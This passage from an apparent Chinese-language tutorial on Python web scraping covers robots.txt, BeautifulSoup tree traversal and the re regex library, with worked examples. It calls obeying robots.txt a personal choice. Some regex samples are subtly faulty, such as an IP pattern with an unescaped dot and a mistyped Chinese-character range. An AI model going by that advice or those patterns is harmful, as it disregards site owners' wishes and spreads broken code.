id="爬虫规则"><a href="#爬虫规则" class="headerlink" title="爬虫规则"></a>爬虫规则</h2><table><thead><tr><th align="center">爬网页</th><th align="center">爬网站、系列网站</th><th align="center">爬全网</th></tr></thead><tbody><tr><td align="center">小规模</td><td align="center">中规模</td><td align="center">大规模</td></tr><tr><td align="center">爬取速度不敏感</td><td align="center">爬取速度敏感</td><td align="center">爬取速度关键</td></tr><tr><td align="center">Requests库</td><td align="center">Scrapy库</td><td align="center">定制库</td></tr></tbody></table><blockquote><p>不要乱爬，乱爬容易出事，不然哪天就进去了</p></blockquote><h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h2><ul><li>网站告知爬虫哪些页面可以爬，哪些不能爬，遵不遵守看个人</li><li>如果网站根目录下没有<code>robots.txt</code>，则表示该网站所有东西都可以爬</li><li><code>类人行为</code>可不参考<code>Robots协议</code>，因为其不会对服务器产生很大的影响，，但是获取的东西不能用于商业用途</li></ul><h1 id="网络爬虫之提取"><a href="#网络爬虫之提取" class="headerlink" title="网络爬虫之提取"></a>网络爬虫之提取</h1><h2 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a>BeautifulSoup库</h2><ul><li>一般引用 <code>bs4</code> 库中的<code>BeautifulSoup</code>类就够了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;p&gt;python&lt;/p&gt;&quot;</span>,<span class="string">&quot;html.parser&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210106191203.png"></p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><ul><li>标签树就是汤，<code>BeautifulSoup</code>类就是将一个标签树变成一个变量，用类里面的方法来熬汤（解析标签树）</li></ul><table><thead><tr><th align="center">基本元素</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center"><code>Tag</code></td><td align="center">标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;&#x2F;&gt;标明开头和结尾</td></tr><tr><td align="center"><code>Name</code></td><td align="center">标签的名字，&lt;p&gt;…&lt;&#x2F;p&gt;的名字是’p’，格式：&lt;tag&gt;.name</td></tr><tr><td align="center"><code>Attributes</code></td><td align="center">标签的属性，字典形式组织，格式：&lt;tag&gt;.attrs</td></tr><tr><td align="center"><code>NavigableString</code></td><td align="center">标签内非属性字符串，&lt;&gt;…&lt;&#x2F;&gt;中字符串，格式：&lt;tag&gt;string</td></tr><tr><td align="center"><code>Comment</code></td><td align="center">标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table><blockquote><p> 如何判断解析出来的字符串是注释还是非属性字符串？</p><p>用<code>type</code>来判断，<code>BeautifulSoup</code>类中这两个的类型不一样</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210106190638.png"></p><h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><ul><li>一共支持四种解析器</li><li>其中<code>xml</code>和<code>lxml</code>需要额外安装<code>lxml</code>库，<code>html5lib</code>需要额外安装<code>html5lib</code>库</li></ul><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">依赖</th></tr></thead><tbody><tr><td align="center"><code>bs4</code>的HTML解析器</td><td align="center">BeautifulSoup(mk,’html.parser’)</td><td align="center">安装bs4库</td></tr><tr><td align="center"><code>lxml</code>的HTML解析器</td><td align="center">BeautifulSoup(mk,’lxml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center"><code>xml</code>的XML解析器</td><td align="center">BeautifulSoup(mk,’xml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center"><code>html5lib</code>的解析器</td><td align="center">BeautifulSoup(mk,’html5lib’)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="基于bs4库的HTML的内容遍历方法"><a href="#基于bs4库的HTML的内容遍历方法" class="headerlink" title="基于bs4库的HTML的内容遍历方法"></a>基于bs4库的HTML的内容遍历方法</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210107013158.png"></p><h3 id="上行遍历"><a href="#上行遍历" class="headerlink" title="上行遍历"></a>上行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>.parent</code></td><td align="center">节点的父亲标签</td></tr><tr><td align="center"><code>.parents</code></td><td align="center">节点先辈标签的迭代类型，用于循环遍历先辈节点</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent.name)</span><br><span class="line">        </span><br><span class="line">p</span><br><span class="line">body</span><br><span class="line">html</span><br><span class="line">[document]</span><br></pre></td></tr></table></figure><h3 id="下行遍历"><a href="#下行遍历" class="headerlink" title="下行遍历"></a>下行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>.contents</code></td><td align="center">子节点的列表，将&lt;tag&gt;的所有儿子节点存入列表</td></tr><tr><td align="center"><code>.children</code></td><td align="center">子节点的迭代类型，与<code>.contents</code>类似，用于循环遍历儿子节点</td></tr><tr><td align="center"><code>.descendants</code></td><td align="center">子孙节点的迭代类型，包含所有子孙节点，用于循环遍历</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;title&quot;</span>&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;course&quot;</span>&gt;Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt; <span class="keyword">and</span> &lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> soup.body.descendants:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;title&quot;</span>&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line">&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;</span><br><span class="line">The demo python introduces several python courses.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;p <span class="keyword">class</span>=<span class="string">&quot;course&quot;</span>&gt;Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt; <span class="keyword">and</span> &lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt;</span><br><span class="line">Basic Python</span><br><span class="line"> <span class="keyword">and</span> </span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br><span class="line">Advanced Python</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="平行遍历"><a href="#平行遍历" class="headerlink" title="平行遍历"></a>平行遍历</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>.next_sibling</code></td><td align="center">返回按照HTML文本顺序的下一个平行节点标签</td></tr><tr><td align="center"><code>.previous_sibling</code></td><td align="center">返回按照HTML文本顺序的上一个平行节点标签</td></tr><tr><td align="center"><code>.next_siblings</code></td><td align="center">迭代类型，返回按照HTML文本顺序的后续所有平行节点标签</td></tr><tr><td align="center"><code>.previous_siblings</code></td><td align="center">迭代类型，返回按照HTML文本顺序的前续所有平行节点标签</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">soup.a</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py1&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-268001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link1&quot;</span>&gt;Basic Python&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">soup.a.next_sibling</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and &#x27;</span></span><br><span class="line"></span><br><span class="line">soup.a.next_sibling.next_sibling</span><br><span class="line"></span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.next_siblings: </span><br><span class="line"><span class="built_in">print</span>(sibling)</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">and</span> </span><br><span class="line">&lt;a <span class="keyword">class</span>=<span class="string">&quot;py2&quot;</span> href=<span class="string">&quot;http://www.icourse163.org/course/BIT-1001870001&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;link2&quot;</span>&gt;Advanced Python&lt;/a&gt;</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.previous_siblings:</span><br><span class="line"><span class="built_in">print</span>(sibling)</span><br><span class="line">    </span><br><span class="line">Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br></pre></td></tr></table></figure><h3 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h3><ul><li>结点不仅仅是尖括号 &lt;&gt; 的标签，还有一些字符内容，比如<code>\n</code>或标签中未被包裹的字符串，都是节点</li></ul><h3 id="美化与编码"><a href="#美化与编码" class="headerlink" title="美化与编码"></a>美化与编码</h3><ul><li><code>prettify()</code>方法用于美化标签内容排版，其实就是加<code>\n</code>来换行，让标签树显示更加美观</li><li><code>BeautifulSoup</code>库对所有传入的HTML文档和字符串都解析成<code>UTF-8</code>编码，Python3 默认也是<code>UTF-8</code>编码，Python2 不是</li></ul><h2 id="信息组织与提取"><a href="#信息组织与提取" class="headerlink" title="信息组织与提取"></a>信息组织与提取</h2><h1 id="网络爬虫之实战"><a href="#网络爬虫之实战" class="headerlink" title="网络爬虫之实战"></a>网络爬虫之实战</h1><h2 id="Re-库入门"><a href="#Re-库入门" class="headerlink" title="Re 库入门"></a>Re 库入门</h2><h3 id="正则表达式语法"><a href="#正则表达式语法" class="headerlink" title="正则表达式语法"></a>正则表达式语法</h3><ul><li>正则表达式语法由字符和操作符组成</li></ul><table><thead><tr><th align="center">操作符</th><th align="center">说明</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center"><code>.</code></td><td align="center">表示任何单个字符</td><td align="center"><strong>.</strong>* 表示任意字符</td></tr><tr><td align="center"><code>[]</code></td><td align="center">字符集，对单个字符给出取值范围</td><td align="center"><strong>[abc]</strong> 表示a、b、c，[a-z] 表示a到z单个字符</td></tr><tr><td align="center"><code>[^]</code></td><td align="center">非字符集，对单个字符给出排除范围</td><td align="center"><strong>[^abc]</strong> 表示非a、b、c的单个字符</td></tr><tr><td align="center"><code>*</code></td><td align="center">前一个字符0次或无限次扩展</td><td align="center"><strong>abc</strong>* 表示ab、abc、abcc、abccc等</td></tr><tr><td align="center"><code>+</code></td><td align="center">前一个字符1次或无限次扩展</td><td align="center"><strong>abc+</strong> 表示abc、abcc、abccc等</td></tr><tr><td align="center"><code>?</code></td><td align="center">前一个字符0次或1次扩展</td><td align="center"><strong>abc?</strong> 表示ab、abc</td></tr><tr><td align="center">&#96;</td><td align="center">&#96;</td><td align="center">左右表达式任意一个</td></tr><tr><td align="center"><code>&#123;m&#125;</code></td><td align="center">扩展前一个字符m次</td><td align="center">**ab{2}c **表示abbc</td></tr><tr><td align="center"><code>&#123;m,n&#125;</code></td><td align="center">扩展前一个字符m至n次（含n）</td><td align="center">**ab{1,2}c **表示abc、abbc</td></tr><tr><td align="center"><code>^</code></td><td align="center">匹配字符串开头</td><td align="center">**^abc **表示abc且在一个字符串的开头</td></tr><tr><td align="center"><code>$</code></td><td align="center">匹配字符串结尾</td><td align="center">**abc$ **表示abc且在一个字符串的结尾</td></tr><tr><td align="center"><code>()</code></td><td align="center">分组标记，内部只能使用| 操作符</td><td align="center"><strong>(abc)</strong> 表示abc，(abc|def)表示abc、def</td></tr><tr><td align="center"><code>\d</code></td><td align="center">数字，等价于[0‐9]</td><td align="center"></td></tr><tr><td align="center"><code>\w</code></td><td align="center">单词字符，等价于[A‐Za‐z0‐9_]</td><td align="center"></td></tr></tbody></table><ul><li>经典举例</li></ul><table><thead><tr><th align="center">re</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>^[A-Za-z]+$</code></td><td align="center">由26个字母组成的字符串</td></tr><tr><td align="center"><code>^[A-Za-z0-9]+$</code></td><td align="center">由26个字母和数字组成的字符串</td></tr><tr><td align="center"><code>^-?\d+$</code></td><td align="center">整数形式的字符串</td></tr><tr><td align="center"><code>^[0-9]*[1-9][0-9]*$</code></td><td align="center">正整数形式的字符串</td></tr><tr><td align="center"><code>[1-9]\d&#123;5&#125;</code></td><td align="center">中国境内邮政编码，6位</td></tr><tr><td align="center"><code>[\u4ee00-\u9fa5]</code></td><td align="center">匹配中文字符，用utf-8编码中中文字符的区间代替</td></tr><tr><td align="center">&#96;\d{3}-\d{8}</td><td align="center">\d{4}-\d{7}&#96;</td></tr></tbody></table><ul><li>非常经典的匹配 IP 地址的正则表达式</li></ul><p><code>0-99</code>：**[1-9]?\d**</p><p><code>100-199</code>：<strong>1\d{2}</strong></p><p><code>200-249</code>：<strong>2[0-4]\d</strong></p><p><code>250-255</code>：<strong>25[0-5]</strong></p><p>整合：<code>(([1-9]?\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5]).)&#123;3&#125;([1-9]?\d|1\d&#123;2&#125;|2[0-4]\d|25[0-5])</code></p><h3 id="re-库基本使用"><a href="#re-库基本使用" class="headerlink" title="re 库基本使用"></a>re 库基本使用</h3><ul><li>python 的标准库，不需要额外安装</li><li><strong>raw string</strong> 原生字符串类型<ul><li>re 库采用原生字符串类型来表示正则表达式，形如 <code>r&#39;text&#39;</code>，用 string 类型也行，但是要用转义字符来转义反斜杠，会更麻烦</li><li>比如：<code>r&#39;[1-9]\d&#123;5&#125;&#39;</code> 、<code>r&#39;\d&#123;3&#125;-\d&#123;8&#125;|\d&#123;4&#125;-\d&#123;7&#125;&#39;</code></li><li>**raw string **是不包含转义符的字符串，转义符比如反斜杠<code>\</code></li></ul></li><li>re 库常用功能函数</li></ul><table><thead><tr><th align="center">函数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>re.search()</code></td><td align="center">在一个字符串中搜索匹配正则表达式的第一个位置，返回 match 对象</td></tr><tr><td align="center"><code>re.match()</code></td><td align="center">从一个字符串的开始位置起匹配正则表达式，返回 match 对象</td></tr><tr><td align="center"><code>re.findall()</code></td><td align="center">搜索字符串，以列表类型返回全部能匹配到的子串</td></tr><tr><td align="center"><code>re.split()</code></td><td align="center">将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td align="center"><code>re.finditer()</code></td><td align="center">搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是 match 对象</td></tr><tr><td align="center"><code>re.sub()</code></td><td align="center">在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td></tr></tbody></table><h4 id="re-search-pattern-string-flags-x3D-0"><a href="#re-search-pattern-string-flags-x3D-0" class="headerlink" title="re.search(pattern,string,flags&#x3D;0)"></a>re.search(pattern,string,flags&#x3D;0)</h4><ul><li><p><strong>在一个字符串中搜索匹配正则表达式的第一个位置，返回 match 对象</strong></p><ul><li><p><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</p></li><li><p><strong>string</strong>：待匹配字符串</p></li><li><p><strong>flags</strong>：正则表达式使用时的控制标记</p><table><thead><tr><th align="center">常用标记</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>re.I re.IGNORECASE</code></td><td align="center">忽略正则表达式的大小写，[A-Z]能够匹配大小写</td></tr><tr><td align="center"><code>re.M re.MULTILINE</code></td><td align="center">正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</td></tr><tr><td align="center"><code>re.S re.DOTALL</code></td><td align="center">正则表达式中的.操作符能够匹配所有字符，默认匹配是除换行以外的所有字符</td></tr></tbody></table></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.search(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br></pre></td></tr></table></figure><h4 id="re-match-pattern-string-flags-x3D-0"><a href="#re-match-pattern-string-flags-x3D-0" class="headerlink" title="re.match(pattern,string,flags&#x3D;0)"></a>re.match(pattern,string,flags&#x3D;0)</h4><ul><li><strong>&#x3D;&#x3D;从一个字符串的开始位置起&#x3D;&#x3D;匹配正则表达式，返回 match 对象</strong><ul><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>string</strong>：待匹配字符串</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT 100081&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#无输出</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span>.group(<span class="number">0</span>)<span class="comment">#直接调用报错，说明没有匹配到</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;pyshell#9&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">AttributeError: <span class="string">&#x27;NoneType&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;group&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;100081 BIT&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line"><span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;100081&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="re-findall-pattern-string-flags-x3D-0"><a href="#re-findall-pattern-string-flags-x3D-0" class="headerlink" title="re.findall(pattern,string,flags&#x3D;0)"></a>re.findall(pattern,string,flags&#x3D;0)</h4><ul><li>搜索字符串，以列表类型返回全部能匹配的子串<ul><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>string</strong>：待匹配字符串</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls = re.findall(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ls</span><br><span class="line">[<span class="string">&#x27;100081&#x27;</span>, <span class="string">&#x27;100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0"><a href="#re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0" class="headerlink" title="re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)"></a>re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)</h4><ul><li>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型，也就是将匹配到的字符串去掉，剩下的存进列表返回<ul><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>string</strong>：待匹配字符串</li><li><strong>maxsplit</strong>：最大分割数，剩余部分作为最后一个元素输出</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU&#x27;</span>, <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.split(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">[<span class="string">&#x27;BIT&#x27;</span>, <span class="string">&#x27; TSU100084&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="re-finditer-pattern-string-flags-x3D-0"><a href="#re-finditer-pattern-string-flags-x3D-0" class="headerlink" title="re.finditer(pattern,string,flags&#x3D;0)"></a>re.finditer(pattern,string,flags&#x3D;0)</h4><ul><li><strong>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</strong><ul><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>string</strong>：待匹配字符串</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span> m:</span><br><span class="line"><span class="built_in">print</span>(m.group(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">100081</span></span><br><span class="line"><span class="number">100084</span> </span><br></pre></td></tr></table></figure><h4 id="re-sub-pattern-repl-string-count-x3D-0-flags-x3D-0"><a href="#re-sub-pattern-repl-string-count-x3D-0-flags-x3D-0" class="headerlink" title="re.sub(pattern,repl, string,count&#x3D;0,flags&#x3D;0)"></a>re.sub(pattern,repl, string,count&#x3D;0,flags&#x3D;0)</h4><ul><li><strong>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</strong><ul><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>repl</strong>：替换匹配字符串的字符串</li><li><strong>string</strong>：待匹配字符串</li><li><strong>count</strong>：匹配的最大替换次数</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.sub(<span class="string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="string">&#x27;:zipcode&#x27;</span>, <span class="string">&#x27;BIT100081 TSU100084&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;BIT:zipcode TSU:zipcode&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="两种用法"><a href="#两种用法" class="headerlink" title="两种用法"></a>两种用法</h4><ul><li><p>函数式用法：一次性操作</p><p><code>rst = re.search(r&#39;[1-9]\d&#123;5&#125;&#39;,&#39;BIT 10091&#39;)</code></p></li><li><p>面向对象用法：将原生字符串编译成一个 re 类的对象，能够进行多次操作</p><p><code>pat = re.compile(r&#39;[1-9]\d&#123;5&#125;&#39;)</code></p><p><code>rst = pat.search(&#39;BIT 10091&#39;)</code></p></li><li><p><strong>re.compile(pattern,flags&#x3D;0)</strong></p><ul><li><strong>将正则表达式的字符串形式编译成正则表达式对象</strong></li><li><strong>pattern</strong>：正则表达式的字符串或原生字符串表示</li><li><strong>flags</strong>：正则表达式使用时的控制标记</li></ul></li></ul><h3 id="match-对象"><a href="#match-对象" class="headerlink" title="match 对象"></a>match 对象</h3><ul><li>match 对象的属性</li></ul><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td 